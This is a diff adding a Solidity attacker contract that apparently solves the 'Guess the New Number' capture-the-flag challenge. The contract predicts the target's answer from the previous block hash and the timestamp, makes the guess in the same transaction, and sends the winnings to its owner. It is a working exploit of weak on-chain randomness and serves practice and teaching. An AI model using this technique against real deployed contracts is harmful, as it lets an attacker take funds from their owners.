@@ -18,3 +18,31 @@ contract GuessTheNewNumberChallenge {
         }
     }
 }
+
+contract GuessTheNewNumberChallengeAttacker {
+    address private owner;
+
+    GuessTheNewNumberChallenge target;
+
+    function GuessTheNewNumberChallengeAttacker(address _target) public payable {
+        owner = msg.sender;
+        target = GuessTheNewNumberChallenge(_target);
+    }
+
+    function attack() public payable {
+        require(msg.sender == owner);
+        require(msg.value == 1 ether);
+        
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+        
+        target.guess.value(1 ether)(answer);
+
+        if (!target.isComplete()) {
+            revert();
+        }
+
+        owner.transfer(address(this).balance);
+    }
+
+    function() public payable {}
+} 
